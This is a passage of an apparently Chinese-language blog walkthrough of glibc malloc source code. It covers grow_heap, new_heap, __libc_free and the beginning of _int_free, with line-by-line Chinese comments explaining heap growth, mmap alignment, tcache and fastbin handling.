&#125;<br>    &#125; <span class="hljs-comment">/* if (av !=  &amp;main_arena) */</span><br>    <span class="hljs-comment">// 如果当前分配区所分配的内存量大于设置的最大值，更新当前分配区最大分配的内存量</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))<br>        av-&gt;max_system_mem = av-&gt;system_mem;<br>    check_malloc_state (av);<br><br>    <span class="hljs-comment">/* finally, do the allocation */</span><br>    p = av-&gt;top;<br>    size = chunksize (p);<br><br>    <span class="hljs-comment">/* check that one of the above allocation paths succeeded */</span><br>    <span class="hljs-comment">// 如果当前 top chunk 中已经有足够的内存来分配所需的 chunk，</span><br>    <span class="hljs-comment">// 从当前的 top chunk 中分配所需的 chunk 并返回</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>    &#123;<br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset (p, nb);<br>        av-&gt;top = remainder;<br>        set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head (remainder, remainder_size | PREV_INUSE);<br>        check_malloced_chunk (av, p, nb);<br>        <span class="hljs-keyword">return</span> chunk2mem (p);<br>    &#125;<br><br>    <span class="hljs-comment">/* catch all failure paths */</span><br>    __set_errno(ENOMEM);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="grow-heap"><a href="#grow-heap" class="headerlink" title="grow_heap"></a>grow_heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">grow_heap</span> <span class="hljs-params">(heap_info *h, <span class="hljs-type">long</span> diff)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br>  <span class="hljs-type">long</span> new_size;<br><br>  diff = ALIGN_UP (diff, pagesize);<br>  new_size = (<span class="hljs-type">long</span>) h-&gt;size + diff;<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) new_size &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) HEAP_MAX_SIZE)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) new_size &gt; h-&gt;mprotect_size)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__mprotect ((<span class="hljs-type">char</span> *) h + h-&gt;mprotect_size,<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) new_size - h-&gt;mprotect_size,<br>                      PROT_READ | PROT_WRITE) != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-2</span>;<br><br>      h-&gt;mprotect_size = new_size;<br>    &#125;<br><br>  h-&gt;size = new_size;<br>  LIBC_PROBE (memory_heap_more, <span class="hljs-number">2</span>, h, h-&gt;size);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="new-heap"><a href="#new-heap" class="headerlink" title="new_heap"></a>new_heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> heap_info *<span class="hljs-title function_">new_heap</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> top_pad)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br>  <span class="hljs-type">char</span> *p1, *p2;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ul;<br>  heap_info *h;<br><br>  <span class="hljs-comment">/* 调整 size 的大小，size 的最小值为 32K,最大值 HEAP_MAX_SIZE 在不同 */</span><br>  <span class="hljs-comment">/* 的系统上不同，在 32 位系统为 1M，64 位系统为 64M，将 size 的大小调 */</span><br>  <span class="hljs-comment">/* 整到最小值与最大值之间，并以页对齐，如果 size 大于最大值，直接报错 */</span><br>  <span class="hljs-keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)<br>    size = HEAP_MIN_SIZE;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)<br>    size += top_pad;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size &gt; HEAP_MAX_SIZE)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">else</span><br>    size = HEAP_MAX_SIZE;<br>  size = ALIGN_UP (size, pagesize);<br><br>  <span class="hljs-comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span><br><span class="hljs-comment">     No swap space needs to be reserved for the following large</span><br><span class="hljs-comment">     mapping (on Linux, this is the case for all non-writable mappings</span><br><span class="hljs-comment">     anyway). */</span><br>  <span class="hljs-comment">/* 全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按 */</span><br>  <span class="hljs-comment">/* 照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束 */</span><br>  <span class="hljs-comment">/* 地址开始映射大小为 HEAP_MAX_SIZE 的内存块，由于全局变量 aligned_heap_area 没 */</span><br>  <span class="hljs-comment">/* 有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟 */</span><br>  <span class="hljs-comment">/* 内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。*/</span><br>  <span class="hljs-comment">/* 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但 */</span><br>  <span class="hljs-comment">/* 返回的虚拟地址不是按 HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败 */</span><br>  p2 = MAP_FAILED;<br>  <span class="hljs-keyword">if</span> (aligned_heap_area)<br>    &#123;<br>      p2 = (<span class="hljs-type">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,<br>                          MAP_NORESERVE);<br>      aligned_heap_area = <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="hljs-number">1</span>)))<br>        &#123;<br>          __munmap (p2, HEAP_MAX_SIZE);<br>          p2 = MAP_FAILED;<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-comment">/* 全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按 */</span><br>  <span class="hljs-comment">/* 照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束 */</span>  <br>  <span class="hljs-comment">/* 地址开始映射大小为 HEAP_MAX_SIZE 的内存块，由于全局变量 aligned_heap_area 没有锁保护，可</span><br><span class="hljs-comment">能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统</span><br><span class="hljs-comment">会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。无论映射是否</span><br><span class="hljs-comment">成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不</span><br><span class="hljs-comment">是按 HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。*/</span><br>  <span class="hljs-keyword">if</span> (p2 == MAP_FAILED)<br>    &#123;<br>      p1 = (<span class="hljs-type">char</span> *) MMAP (<span class="hljs-number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="hljs-number">1</span>, PROT_NONE, MAP_NORESERVE);<br><br>      <span class="hljs-comment">/* 映射 2 倍 HEAP_MAX_SIZE 大小的虚拟内存成功，将大于等于 p1 并按 HEAP_MAX_SIZE */</span><br>      <span class="hljs-comment">/* 大小对齐的第一个虚拟地址赋值给 p2，p2 作为 sub_heap 的起始虚拟地址，p2+HEAP_MAX_SIZE */</span><br>      <span class="hljs-comment">/* 作为 sub_heap 的结束地址，并将 sub_heap 的结束地址赋值给全局变量aligned_heap_area，*/</span><br>      <span class="hljs-comment">/* 最后还需要将多余的虚拟内存还回给操作系统 */</span><br>      <span class="hljs-keyword">if</span> (p1 != MAP_FAILED)<br>        &#123;<br>          p2 = (<span class="hljs-type">char</span> *) (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) p1 + (HEAP_MAX_SIZE - <span class="hljs-number">1</span>))<br>                         &amp; ~(HEAP_MAX_SIZE - <span class="hljs-number">1</span>));<br>          ul = p2 - p1;<br>          <span class="hljs-keyword">if</span> (ul)<br>            __munmap (p1, ul);<br>          <span class="hljs-keyword">else</span><br>            aligned_heap_area = p2 + HEAP_MAX_SIZE;<br>          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span><br><span class="hljs-comment">             is already aligned. */</span><br>          <span class="hljs-comment">/* 映射 2 倍 HEAP_MAX_SIZE 大小的虚拟内存失败了，再尝试映射 HEAP_MAX_SIZE */</span><br>          <span class="hljs-comment">/* 大小的虚拟内存，如果失败，返回；如果成功，但该虚拟地址不是按照 HEAP_MAX_SIZE */</span><br>          <span class="hljs-comment">/* 大小对齐的，返回 */</span><br>          p2 = (<span class="hljs-type">char</span> *) MMAP (<span class="hljs-number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);<br>          <span class="hljs-keyword">if</span> (p2 == MAP_FAILED)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="hljs-number">1</span>))<br>            &#123;<br>              __munmap (p2, HEAP_MAX_SIZE);<br>              <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>  <span class="hljs-comment">/* 调用 mprotect()函数将 size 大小的内存设置为可读可写，如果失败，*/</span><br>  <span class="hljs-comment">/* 解除整个 sub_heap 的映射。然后更新 heap_info 实例中的相关字段 */</span><br>  <span class="hljs-keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="hljs-number">0</span>)<br>    &#123;<br>      __munmap (p2, HEAP_MAX_SIZE);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  h = (heap_info *) p2;<br>  h-&gt;size = size;<br>  h-&gt;mprotect_size = size;<br>  LIBC_PROBE (memory_heap_new, <span class="hljs-number">2</span>, h, h-&gt;size);<br>  <span class="hljs-keyword">return</span> h;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  free(void* p)</span><br><span class="hljs-comment">  Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="hljs-comment">  allocated using malloc or a related routine such as realloc.</span><br><span class="hljs-comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="hljs-comment">  effects if p has already been freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="hljs-comment">  when possible, automatically trigger operations that give</span><br><span class="hljs-comment">  back unused memory to the system, thus reducing program footprint.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> __libc_free(<span class="hljs-type">void</span> *mem) &#123;<br>    mstate ar_ptr;<br>    mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>    <span class="hljs-comment">// 如果存在 __free_hook 则执行其内容</span><br>    <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// 拿到程序指针</span><br>    p = mem2chunk (mem);<br><br>    <span class="hljs-comment">// 如果 chunk 是 mmap 函数返回的，则使用 munmap_chunk 函数释放</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-comment">// 如果开启了mmap分配阈值动态调整机制</span><br>        <span class="hljs-comment">// 如果当前 free 的 chunk 的大小大于设置的 mmap 分配阈值</span><br>        <span class="hljs-comment">// 且小于 mmap 分配阈值的最大值</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>            &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>            &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX<br>            &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123;<br>            <span class="hljs-comment">// 将当前 chunk 的大小赋值给 mmap 分配阈值</span><br>            mp_.mmap_threshold = chunksize (p);<br>            <span class="hljs-comment">// mmap 收缩阈值为 mmap分配阈值的 2 倍</span><br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        <span class="hljs-comment">//然后调用 munmap_chunk释放函数</span><br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    MAYBE_INIT_TCACHE ();<br>    <span class="hljs-comment">// 获得指向 arena 的指针</span><br>    ar_ptr = arena_for_chunk (p);<br>    <span class="hljs-comment">// 使用 _int_free 释放 chunk</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free(mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br>    INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>    mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>    mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>    INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>    INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>    mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>    mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>    <span class="hljs-comment">// #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br>    <span class="hljs-comment">// #define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br>    <span class="hljs-comment">// #define chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br>    <span class="hljs-comment">// 拿到去除标志位的 size</span><br>    size = chunksize (p);<br><br>    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 如果 chunk 的指针地址溢出</span><br>    <span class="hljs-comment">// 或 chunk 并没有对齐</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) - size, <span class="hljs-number">0</span>)<br>        || __builtin_expect(misaligned_chunk (p), <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;free(): invalid pointer&quot;</span>);<br>    <span class="hljs-comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span><br><span class="hljs-comment">       multiple of MALLOC_ALIGNMENT.  */</span><br><br>    <span class="hljs-comment">// 如果 size 小于 MINSIZE</span><br>    <span class="hljs-comment">// 或者 size 没有对其</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size)))<br>    malloc_printerr(<span class="hljs-string">&quot;free(): invalid size&quot;</span>);<br><br>    <span class="hljs-comment">// 啥也没干</span><br>    check_inuse_chunk(av, p);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    &#123;<br>      <span class="hljs-comment">// 拿到对应的 tcache 索引</span><br>      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br><br>      <span class="hljs-comment">// 如果开启了 tcache</span><br>      <span class="hljs-comment">// 且 索引没有超过出范围</span><br>      <span class="hljs-comment">// 且 对应的 tcache 未满</span><br>      <span class="hljs-keyword">if</span> (tcache<br>      &amp;&amp; tc_idx &lt; mp_.tcache_bins<br>      &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>        &#123;<br>          <span class="hljs-comment">// 将该 chunk 放在对应的 tcache 里</span><br>          tcache_put (p, tc_idx);<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If eligible, place chunk on a fastbin so it can be found</span><br><span class="hljs-comment">      and used quickly in malloc.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 如果 size 在 fastbin 的范围之内</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast())<br><br>    <span class="hljs-comment">// 如果设置了 TRIM_FASTBINS，不要将靠近顶部的块放入 fastbins</span><br>    <span class="hljs-comment">// 但 